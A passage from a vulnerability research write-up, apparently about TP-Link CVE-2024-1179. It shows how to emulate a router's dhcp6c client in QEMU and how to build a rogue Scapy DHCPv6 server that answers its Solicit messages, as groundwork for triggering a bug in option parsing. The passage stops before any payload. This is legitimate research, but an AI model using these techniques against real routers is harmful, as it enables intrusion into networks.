</span></span><span style=display:flex><span>.
</span></span><span style=display:flex><span>.
</span></span><span style=display:flex><span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>8: tap0: &lt;BROADCAST,MULTICAST,PROMISC,UP,LOWER_UP&gt; mtu <span style=color:#ae81ff>1500</span> qdisc pfifo_fast master br0 state UP group default qlen <span style=color:#ae81ff>1000</span>
</span></span><span style=display:flex><span>    link/ether ae:69:9b:7b:56:e1 brd ff:ff:ff:ff:ff:ff
</span></span><span style=display:flex><span>11: br0: &lt;BROADCAST,MULTICAST,PROMISC,UP,LOWER_UP&gt; mtu <span style=color:#ae81ff>1500</span> qdisc noqueue state UP group default qlen <span style=color:#ae81ff>1000</span>
</span></span><span style=display:flex><span>    link/ether da:30:2c:48:59:a8 brd ff:ff:ff:ff:ff:ff
</span></span><span style=display:flex><span>    inet 10.212.81.52/16 brd 10.212.255.255 scope global dynamic noprefixroute br0
</span></span><span style=display:flex><span>       valid_lft 603777sec preferred_lft 603777sec
</span></span><span style=display:flex><span>    inet6 fe80::542b:76ce:631b:36ce/64 scope link noprefixroute 
</span></span><span style=display:flex><span>       valid_lft forever preferred_lft forever
</span></span></code></pre></div><p>We can see there that the newly created bridge <code>br0</code> get assigned the IP address <code>10.212.81.52</code> (private address) with a <code>/16</code> mask. So we are on the subnet <code>10.212.0.0/16</code>.
On the qemu VM, we also inspect the network configuration. We notice that it&rsquo;s <code>eth0</code> interface get assigned the IP address <code>10.212.141.194</code> which is an address belonging to <code>10.212.0.0/16</code> subnet. Thus the host and the qemu VM are now on the same subnet.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>/ <span style=color:#75715e># root@debian-mipsel:~/squashfs-root# ifconfig </span>
</span></span><span style=display:flex><span>eth0      Link encap:Ethernet  HWaddr 00:11:22:33:44:55  
</span></span><span style=display:flex><span>          inet addr:10.212.141.194  Bcast:10.212.255.255  Mask:255.255.0.0
</span></span><span style=display:flex><span>          inet6 addr: fe80::211:22ff:fe33:4455/64 Scope:Link
</span></span><span style=display:flex><span>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span></span><span style=display:flex><span>          RX packets:3554 errors:1 dropped:78 overruns:0 frame:0
</span></span><span style=display:flex><span>          TX packets:38 errors:0 dropped:0 overruns:0 carrier:0
</span></span><span style=display:flex><span>          collisions:0 txqueuelen:1000 
</span></span><span style=display:flex><span>          RX bytes:643796 <span style=color:#f92672>(</span>628.7 KiB<span style=color:#f92672>)</span>  TX bytes:3724 <span style=color:#f92672>(</span>3.6 KiB<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>          Interrupt:11 Base address:0x1060 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>lo        Link encap:Local Loopback  
</span></span><span style=display:flex><span>          inet addr:127.0.0.1  Mask:255.0.0.0
</span></span><span style=display:flex><span>          inet6 addr: ::1/128 Scope:Host
</span></span><span style=display:flex><span>          UP LOOPBACK RUNNING  MTU:65536  Metric:1
</span></span><span style=display:flex><span>          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
</span></span><span style=display:flex><span>          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
</span></span><span style=display:flex><span>          collisions:0 txqueuelen:0 
</span></span><span style=display:flex><span>          RX bytes:0 <span style=color:#f92672>(</span>0.0 B<span style=color:#f92672>)</span>  TX bytes:0 <span style=color:#f92672>(</span>0.0 B<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>However in this configuration we have a private network between the host and the VM. That is enough to do what we want. We can ping the host from the VM.</p><pre tabindex=0><code>/ # ping 10.212.81.52
PING 10.212.81.52 (10.212.81.52): 56 data bytes
64 bytes from 10.212.81.52: seq=0 ttl=64 time=2.117 ms
64 bytes from 10.212.81.52: seq=1 ttl=64 time=1.017 ms
^C
--- 10.212.81.52 ping statistics ---
2 packets transmitted, 2 packets received, 0% packet loss
round-trip min/avg/max = 1.017/1.567/2.117 ms
</code></pre><p>But we need more if we want the VM to access internet. The packet coming from the router can reach the bridge <code>br0</code>, but cannot reach the internet. We just need to add a NAT rule in iptables for outgoing traffic from our subnet.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>sudo iptables -t nat -A POSTROUTING -s 10.212.0.0/16 -o br0 -j MASQUERADE
</span></span></code></pre></div><p>Now we have a configuration where <code>br0</code> acts as a switch connecting our host and the router, and then the switch is connected to internet.</p><p>Now start the binary with an empy configuration file, and start capturing network packets on <code>br0</code> interface using Wireshark. We can see a DHCP sollicit message on Wireshark.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>/ <span style=color:#75715e># /usr/sbin/dhcp6c -dDf -c test.conf eth0</span>
</span></span><span style=display:flex><span>Oct/29/2024 00:37:51: gethwid: found an interface eth0 <span style=color:#66d9ef>for</span> DUID
</span></span><span style=display:flex><span>Oct/29/2024 00:37:51: get_duid: generated a new DUID: 00:03:00:01:00:11:22:33:44:55
</span></span><span style=display:flex><span>Oct/29/2024 00:37:51: dhcp6_ctl_authinit: failed to open /etc/dhcp6cctlkey: No such file or directory
</span></span><span style=display:flex><span>Oct/29/2024 00:37:51: client6_init: failed initialize control message authentication
</span></span><span style=display:flex><span>Oct/29/2024 00:37:51: client6_init: skip opening control port
</span></span><span style=display:flex><span>Oct/29/2024 00:37:51: client6_init: client6_init <span style=color:#ae81ff>502</span> client6_init succeed
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>client6_init <span style=color:#ae81ff>503</span> client6_init succeed
</span></span><span style=display:flex><span>Oct/29/2024 00:37:51: configure_pool: called
</span></span><span style=display:flex><span>Oct/29/2024 00:37:51: clear_poolconf: called
</span></span><span style=display:flex><span>Oct/29/2024 00:37:51: dhcp6_reset_timer: reset a timer on eth0, state<span style=color:#f92672>=</span>INIT, timeo<span style=color:#f92672>=</span>0, retrans<span style=color:#f92672>=</span><span style=color:#ae81ff>514</span>
</span></span><span style=display:flex><span>Oct/29/2024 00:37:52: client6_send: a new XID <span style=color:#f92672>(</span>c599<span style=color:#f92672>)</span> is generated
</span></span><span style=display:flex><span>Oct/29/2024 00:37:52: copy_option: set client ID <span style=color:#f92672>(</span>len 10<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/29/2024 00:37:52: copy_option: set elapsed time <span style=color:#f92672>(</span>len 2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/29/2024 00:37:52: copy_option: set option request <span style=color:#f92672>(</span>len 2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/29/2024 00:37:52: client6_send: send solicit to ff02::1:2%eth0
</span></span><span style=display:flex><span>Oct/29/2024 00:37:52: dhcp6_reset_timer: reset a timer on eth0, state<span style=color:#f92672>=</span>SOLICIT, timeo<span style=color:#f92672>=</span>0, retrans<span style=color:#f92672>=</span><span style=color:#ae81ff>1050</span>
</span></span><span style=display:flex><span>Oct/29/2024 00:37:53: copy_option: set client ID <span style=color:#f92672>(</span>len 10<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/29/2024 00:37:53: copy_option: set elapsed time <span style=color:#f92672>(</span>len 2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/29/2024 00:37:53: copy_option: set option request <span style=color:#f92672>(</span>len 2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/29/2024 00:37:53: client6_send: send solicit to ff02::1:2%eth0
</span></span><span style=display:flex><span>Oct/29/2024 00:37:53: dhcp6_reset_timer: reset a timer on eth0, state<span style=color:#f92672>=</span>SOLICIT, timeo<span style=color:#f92672>=</span>1, retrans<span style=color:#f92672>=</span><span style=color:#ae81ff>2056</span>
</span></span><span style=display:flex><span>Oct/29/2024 00:37:55: copy_option: set client ID <span style=color:#f92672>(</span>len 10<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/29/2024 00:37:55: copy_option: set elapsed time <span style=color:#f92672>(</span>len 2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/29/2024 00:37:55: copy_option: set option request <span style=color:#f92672>(</span>len 2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/29/2024 00:37:55: client6_send: send solicit to ff02::1:2%eth0
</span></span><span style=display:flex><span>Oct/29/2024 00:37:55: dhcp6_reset_timer: reset a timer on eth0, state<span style=color:#f92672>=</span>SOLICIT, timeo<span style=color:#f92672>=</span>2, retrans<span style=color:#f92672>=</span><span style=color:#ae81ff>4132</span>
</span></span><span style=display:flex><span>Oct/29/2024 00:37:59: copy_option: set client ID <span style=color:#f92672>(</span>len 10<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/29/2024 00:37:59: copy_option: set elapsed time <span style=color:#f92672>(</span>len 2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/29/2024 00:37:59: copy_option: set option request <span style=color:#f92672>(</span>len 2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/29/2024 00:37:59: client6_send: send solicit to ff02::1:2%eth0
</span></span><span style=display:flex><span>Oct/29/2024 00:37:59: dhcp6_reset_timer: reset a timer on eth0, state<span style=color:#f92672>=</span>SOLICIT, timeo<span style=color:#f92672>=</span>3, retrans<span style=color:#f92672>=</span><span style=color:#ae81ff>8289</span>
</span></span><span style=display:flex><span>Oct/29/2024 00:38:07: copy_option: set client ID <span style=color:#f92672>(</span>len 10<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/29/2024 00:38:07: copy_option: set elapsed time <span style=color:#f92672>(</span>len 2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/29/2024 00:38:07: copy_option: set option request <span style=color:#f92672>(</span>len 2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/29/2024 00:38:07: client6_send: send solicit to ff02::1:2%eth0
</span></span><span style=display:flex><span>Oct/29/2024 00:38:07: dhcp6_reset_timer: reset a timer on eth0, state<span style=color:#f92672>=</span>SOLICIT, timeo<span style=color:#f92672>=</span>4, retrans<span style=color:#f92672>=</span><span style=color:#ae81ff>15930</span>
</span></span></code></pre></div><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241029013901.png><figcaption><h4></h4></figcaption></figure><p>As we said earlier, with option <code>-i</code>, we have a <code>information-request</code> message.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241029215056.png><figcaption><h4></h4></figcaption></figure><p>Remember that the vulnerability concerns IPv6 and by default we already have an IPv4 address assigned to us.</p><blockquote><p>Take a look on qemu VM machine network configuration once more (previous). At first glance, we might think that there is already assigned IPv6 address on <code>eth0</code>.</p><p>But no, this is a link local addressee.</p><p><strong>IPv6 Link-Local Address</strong>: In IPv6, link-local addresses are automatically assigned to each interface and are in the <code>fe80::/10</code> address range. For example, <code>fe80::abcd:ef01:2345</code> might be a device&rsquo;s link-local address.</p><p>link-local address An IPv6 address having a link-only scope,
indicated by having the prefix (fe80::/10),
that can be used to reach neighboring nodes
attached to the same link. Every IPv6
interface on which DHCPv6 can reasonably be
useful has a link-local address.</p></blockquote><p>Now we need to create our DHCPv6 server. As we already have an IPv4 address and can contact the host, we don&rsquo;t really need a full functional dhcpv6 server to exploit our bug.
According to <a href=https://datatracker.ietf.org/doc/html/rfc8415#section-5.2>RFC8415</a>, we have the following flow when the client tries to get an IP address from DHCPv6 server.</p><p><img alt=https://www.h3c.com/en/d_202106/1419224_294551_0.htm src=../../20210626_5853423_x_Img_x_png_1_1419224_294551_0.png>
<a href=https://www.h3c.com/en/d_202106/1419224_294551_0.htm>DHCPv6 flow</a></p><p>As we will need to build our own DHCPv6 packets that will be sent, we will use <strong>Scapy</strong>. The DHCPv6 server we will build will listen on a chosen interface for Solicit messages and respond with an advertise. Advertise messages will allow us to debug where the vulnerability exists because we know from <a href=https://datatracker.ietf.org/doc/html/rfc6334#section-3>here</a> that <code>AFTR_NAME</code> options can be used in Advertise messages.</p><p>We can rely on <a href=https://github.com/secdev/scapy/blob/master/scapy/layers/dhcp6.py#L1795>Scapy DHCPv6 implementation</a> to build our server.</p><p>We start first with a simple script that filters and prints the received solicit messages:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> scapy.all <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> scapy.layers.dhcp6 <span style=color:#f92672>import</span> DHCP6_Solicit
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>target_mac <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;00:11:22:33:44:55&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>filter_solicit_msg</span>(pkt):
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> pkt<span style=color:#f92672>.</span>haslayer(DHCP6_Solicit) <span style=color:#f92672>and</span> pkt[Ether]<span style=color:#f92672>.</span>src <span style=color:#f92672>==</span> target_mac
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>interface <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;br0&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>response <span style=color:#f92672>=</span> sniff(iface<span style=color:#f92672>=</span>interface, filter<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;udp and port 546&#34;</span>, prn<span style=color:#f92672>=</span><span style=color:#66d9ef>lambda</span> x: x<span style=color:#f92672>.</span>show(), lfilter<span style=color:#f92672>=</span>filter_solicit_msg)
</span></span></code></pre></div><p>After executing this python script, we have :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#75715e>###[ Ethernet ]###</span>
</span></span><span style=display:flex><span>  dst       <span style=color:#f92672>=</span> 33:33:00:01:00:02
</span></span><span style=display:flex><span>  src       <span style=color:#f92672>=</span> 00:11:22:33:44:55
</span></span><span style=display:flex><span>  type      <span style=color:#f92672>=</span> IPv6
</span></span><span style=display:flex><span><span style=color:#75715e>###[ IPv6 ]###</span>
</span></span><span style=display:flex><span>     version   <span style=color:#f92672>=</span> <span style=color:#ae81ff>6</span>
</span></span><span style=display:flex><span>     tc        <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>     fl        <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>     plen      <span style=color:#f92672>=</span> <span style=color:#ae81ff>38</span>
</span></span><span style=display:flex><span>     nh        <span style=color:#f92672>=</span> UDP
</span></span><span style=display:flex><span>     hlim      <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>     src       <span style=color:#f92672>=</span> fe80::211:22ff:fe33:4455
</span></span><span style=display:flex><span>     dst       <span style=color:#f92672>=</span> ff02::1:2
</span></span><span style=display:flex><span><span style=color:#75715e>###[ UDP ]###</span>
</span></span><span style=display:flex><span>        sport     <span style=color:#f92672>=</span> dhcpv6_client
</span></span><span style=display:flex><span>        dport     <span style=color:#f92672>=</span> dhcpv6_server
</span></span><span style=display:flex><span>        len       <span style=color:#f92672>=</span> <span style=color:#ae81ff>38</span>
</span></span><span style=display:flex><span>        chksum    <span style=color:#f92672>=</span> 0x2421
</span></span><span style=display:flex><span><span style=color:#75715e>###[ DHCPv6 Solicit Message ]###</span>
</span></span><span style=display:flex><span>           msgtype   <span style=color:#f92672>=</span> SOLICIT
</span></span><span style=display:flex><span>           trid      <span style=color:#f92672>=</span> 0x650957
</span></span><span style=display:flex><span><span style=color:#75715e>###[ DHCP6 Client Identifier Option ]###</span>
</span></span><span style=display:flex><span>              optcode   <span style=color:#f92672>=</span> CLIENTID
</span></span><span style=display:flex><span>              optlen    <span style=color:#f92672>=</span> <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span>              <span style=color:#ae81ff>\d</span>uid      <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>               |<span style=color:#75715e>###[ DUID - Based on Link-layer Address ]###</span>
</span></span><span style=display:flex><span>               |  type      <span style=color:#f92672>=</span> Link-layer Address
</span></span><span style=display:flex><span>               |  hwtype    <span style=color:#f92672>=</span> Ethernet <span style=color:#f92672>(</span>10Mb<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>               |  lladdr    <span style=color:#f92672>=</span> 00:11:22:33:44:55
</span></span><span style=display:flex><span><span style=color:#75715e>###[ DHCP6 Elapsed Time Option ]###</span>
</span></span><span style=display:flex><span>                 optcode   <span style=color:#f92672>=</span> ELAPSED_TIME
</span></span><span style=display:flex><span>                 optlen    <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>                 elapsedtime<span style=color:#f92672>=</span> 1.02 sec
</span></span><span style=display:flex><span><span style=color:#75715e>###[ DHCP6 Option Request Option ]###</span>
</span></span><span style=display:flex><span>                    optcode   <span style=color:#f92672>=</span> ORO
</span></span><span style=display:flex><span>                    optlen    <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>                    reqopts   <span style=color:#f92672>=</span> <span style=color:#f92672>[</span>64<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>Now we continue to build our simple dhcpv6 server. We can follow <a href=https://github.com/secdev/scapy/blob/master/scapy/layers/dhcp6.py#L1795>https://github.com/secdev/scapy/blob/master/scapy/layers/dhcp6.py#L1795</a>. As explained earlier, options are used to provide additional configuration information. According to <a href=https://datatracker.ietf.org/doc/html/rfc8415#section-16.3>RFC 8415 section 16.3</a>, to build our advertise response, we need at least to provide client identifier and server identifier. The RFC explains more about what these options are.</p><figure><img src=https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030005712.png><figcaption><h4></h4></figcaption></figure><p>And <strong>Scapy</strong> already has a class to create them (<code>DHCP6OptClientId</code> and <code>DHCP6OptServerId</code>).
By creating each layer for the DHCPv6 advertise message that will be sent, we have the following script with comments:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> scapy.all <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> scapy.layers.inet6 <span style=color:#f92672>import</span> IPv6, UDP
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> scapy.layers.dhcp6 <span style=color:#f92672>import</span> DHCP6_Solicit, DHCP6OptServerId, DHCP6OptClientId
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>br0: flags=4419&lt;UP,BROADCAST,RUNNING,PROMISC,MULTICAST&gt; mtu 1500
</span></span></span><span style=display:flex><span><span style=color:#e6db74>inet 10.212.81.52 netmask 255.255.0.0 broadcast 10.212.255.255
</span></span></span><span style=display:flex><span><span style=color:#e6db74>inet6 fe80::542b:76ce:631b:36ce prefixlen 64 scopeid 0x20&lt;link&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>ether da:30:2c:48:59:a8 txqueuelen 1000 (Ethernet)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>RX packets 652899 bytes 434959083 (434.9 MB)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>RX errors 0 dropped 0 overruns 0 frame 0
</span></span></span><span style=display:flex><span><span style=color:#e6db74>TX packets 284487 bytes 81342637 (81.3 MB)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>target_mac <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;00:11:22:33:44:55&#34;</span> <span style=color:#75715e># qemu</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>br0_mac <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;da:30:2c:48:59:a8&#34;</span>
</span></span><span style=display:flex><span>br0_link_local_inet6 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;fe80::542b:76ce:631b:36ce&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>filter_solicit_msg</span>(pkt):
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> pkt<span style=color:#f92672>.</span>haslayer(DHCP6_Solicit) <span style=color:#f92672>and</span> pkt[Ether]<span style=color:#f92672>.</span>src <span style=color:#f92672>==</span> target_mac
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>send_dhcp6_advertise</span>(p):
</span></span><span style=display:flex><span>    <span style=color:#75715e># Set up Ethernet layer with source and destination MAC addresses</span>
</span></span><span style=display:flex><span>    src_mac <span style=color:#f92672>=</span> br0_mac  <span style=color:#75715e># Bridge interface MAC address</span>
</span></span><span style=display:flex><span>    dst_mac <span style=color:#f92672>=</span> p[Ether]<span style=color:#f92672>.</span>src  <span style=color:#75715e># Client&#39;s MAC address from original packet</span>
</span></span><span style=display:flex><span>    ethernet_layer <span style=color:#f92672>=</span> Ether(src<span style=color:#f92672>=</span>src_mac, dst<span style=color:#f92672>=</span>dst_mac)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># Set up IPv6 layer with source and destination addresses</span>
</span></span><span style=display:flex><span>    ipv6_dst <span style=color:#f92672>=</span> p[IPv6]<span style=color:#f92672>.</span>src  <span style=color:#75715e># Client&#39;s IPv6 address from original packet</span>
</span></span><span style=display:flex><span>    ipv6_src <span style=color:#f92672>=</span> br0_link_local_inet6  <span style=color:#75715e># Bridge interface link-local address</span>
</span></span><span style=display:flex><span>    ipv6_layer <span style=color:#f92672>=</span> IPv6(src<span style=color:#f92672>=</span>ipv6_src, dst<span style=color:#f92672>=</span>ipv6_dst)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># Set up UDP layer with DHCPv6 ports</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Port 547: Server port, Port 546: Client port</span>
</span></span><span style=display:flex><span>    udp_layer <span style=color:#f92672>=</span> UDP(sport<span style=color:#f92672>=</span><span style=color:#ae81ff>547</span>, dport<span style=color:#f92672>=</span><span style=color:#ae81ff>546</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># Extract client DUID and transaction ID from original Solicit message</span>
</span></span><span style=display:flex><span>    client_duid <span style=color:#f92672>=</span> p[DHCP6OptClientId]<span style=color:#f92672>.</span>duid
</span></span><span style=display:flex><span>    trid <span style=color:#f92672>=</span> p[DHCP6_Solicit]<span style=color:#f92672>.</span>trid
</span></span><span style=display:flex><span>    dhcp6_advertise <span style=color:#f92672>=</span> DHCP6_Advertise(trid<span style=color:#f92672>=</span>trid)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># Create DHCPv6 options</span>
</span></span><span style=display:flex><span>    client_id <span style=color:#f92672>=</span> DHCP6OptClientId(duid<span style=color:#f92672>=</span>client_duid)  <span style=color:#75715e># Client Identifier option</span>
</span></span><span style=display:flex><span>    server_id <span style=color:#f92672>=</span> DHCP6OptServerId(duid<span style=color:#f92672>=</span>DUID_LLT(hwtype<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>, lladdr<span style=color:#f92672>=</span>src_mac))  <span style=color:#75715e># Server Identifier option</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># Combine all layers and send packet</span>
</span></span><span style=display:flex><span>    pck <span style=color:#f92672>=</span> ethernet_layer <span style=color:#f92672>/</span> ipv6_layer <span style=color:#f92672>/</span> udp_layer <span style=color:#f92672>/</span> dhcp6_advertise <span style=color:#f92672>/</span> server_id <span style=color:#f92672>/</span> client_id
</span></span><span style=display:flex><span>    sendp(pck, iface<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;br0&#34;</span>, verbose<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>interface <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;br0&#39;</span>
</span></span><span style=display:flex><span>response <span style=color:#f92672>=</span> sniff(iface<span style=color:#f92672>=</span>interface, filter<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;udp and port 546&#34;</span>, prn<span style=color:#f92672>=</span>send_dhcp6_advertise, lfilter<span style=color:#f92672>=</span>filter_solicit_msg)
</span></span></code></pre></div><p>And on the qemu VM, we can see that the advertise message is received and <code>dhcp6_get_options</code> is called to get each options and then the client responds with a request message:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>/ <span style=color:#75715e># /usr/sbin/dhcp6c -dDf -c test.conf  eth0</span>
</span></span><span style=display:flex><span>.
</span></span><span style=display:flex><span>.
</span></span><span style=display:flex><span>.
</span></span><span style=display:flex><span>Oct/30/2024 00:30:49: copy_option: set client ID <span style=color:#f92672>(</span>len 10<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/30/2024 00:30:49: copy_option: set elapsed time <span style=color:#f92672>(</span>len 2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/30/2024 00:30:49: copy_option: set option request <span style=color:#f92672>(</span>len 2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/30/2024 00:30:49: client6_send: send solicit to ff02::1:2%eth0
</span></span><span style=display:flex><span>Oct/30/2024 00:30:49: dhcp6_reset_timer: reset a timer on eth0, state<span style=color:#f92672>=</span>SOLICIT, timeo<span style=color:#f92672>=</span>0, retrans<span style=color:#f92672>=</span><span style=color:#ae81ff>1072</span>
</span></span><span style=display:flex><span>Oct/30/2024 00:30:49: client6_recv: receive advertise from fe80::542b:76ce:631b:36ce%eth0 on eth0
</span></span><span style=display:flex><span>Oct/30/2024 00:30:49: dhcp6_get_options: get DHCP option server ID, len <span style=color:#ae81ff>14</span>
</span></span><span style=display:flex><span>Oct/30/2024 00:30:49:   DUID: 00:01:00:01:00:00:00:00:da:30:2c:48:59:a8
</span></span><span style=display:flex><span>Oct/30/2024 00:30:49: dhcp6_get_options: get DHCP option client ID, len <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span>Oct/30/2024 00:30:49:   DUID: 00:03:00:01:00:11:22:33:44:55
</span></span><span style=display:flex><span>Oct/30/2024 00:30:49: client6_recvadvert: server ID: 00:01:00:01:00:00:00:00:da:30:2c:48:59:a8, pref<span style=color:#f92672>=</span>-1
</span></span><span style=display:flex><span>Oct/30/2024 00:30:49: client6_recvadvert: reset timer <span style=color:#66d9ef>for</span> eth0 to 0.973980
</span></span><span style=display:flex><span>Oct/30/2024 00:30:50: select_server: picked a server <span style=color:#f92672>(</span>ID: 00:01:00:01:00:00:00:00:da:30:2c:48:59:a8<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/30/2024 00:30:50: client6_send: a new XID <span style=color:#f92672>(</span>a447e5<span style=color:#f92672>)</span> is generated
</span></span><span style=display:flex><span>Oct/30/2024 00:30:50: copy_option: set client ID <span style=color:#f92672>(</span>len 10<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/30/2024 00:30:50: copy_option: set server ID <span style=color:#f92672>(</span>len 14<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/30/2024 00:30:50: copy_option: set elapsed time <span style=color:#f92672>(</span>len 2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/30/2024 00:30:50: copy_option: set option request <span style=color:#f92672>(</span>len 2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Oct/30/2024 00:30:50: client6_send: send request to ff02::1:2%eth0
</span></span><span style=display:flex><span>.
</span></span><span style=display:flex><span>.
</span></span><span style=display:flex><span>.
